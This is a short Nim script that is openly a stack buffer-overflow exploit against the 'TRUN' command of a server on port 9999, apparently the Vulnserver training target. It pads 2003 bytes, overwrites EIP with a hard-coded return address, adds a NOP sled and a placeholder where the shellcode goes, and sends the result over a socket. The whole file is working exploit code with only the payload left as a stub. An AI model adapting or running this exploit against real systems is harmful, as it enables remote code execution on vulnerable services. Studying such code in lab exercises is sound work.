import net
import strutils

let host = "192.168.136.49"
let port = Port(9999)
let offset = 2003
let eip = "\xaf\x11\x50\x62"  # Address in little-endian format
let nop_sled = repeat("\x90", 10)  # NOP sled to aid in shellcode execution
let shellcode = repeat("C", 2000)  # Placeholder for actual shellcode

# Construct the buffer
let buffer = repeat("A", offset) & eip & nop_sled & shellcode

var sock = newSocket()

try:
  sock.connect(host, port)
  echo sock.recvLine()
  
  echo "Sending Exploit"
  sock.send("TRUN /.:/" & buffer)
  
  echo sock.recvLine()

finally:
  sock.close()
